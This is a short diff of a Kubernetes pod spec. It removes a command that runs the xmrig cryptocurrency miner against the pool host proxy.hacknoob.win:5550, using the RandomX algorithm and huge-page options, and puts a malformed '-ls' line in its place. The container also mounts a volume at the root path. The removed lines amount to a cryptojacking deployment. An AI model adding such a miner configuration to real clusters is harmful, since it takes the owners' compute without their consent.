@@ -16,18 +16,7 @@ spec:
   - name: xmrig-container-m
     image: busybox
     command:
-    - /home/manager/xmrig/build/xmrig
-    - -t
-    - "2"
-    - -o
-    - proxy.hacknoob.win:5550
-    - -u
-    - master
-    - -a
-    - rx/0
-    - --cpu-no-yield
-    - --nicehash
-    - --randomx-1gb-pages
+    -ls
     volumeMounts:
     - name: xmrig-volume-m
       mountPath: /
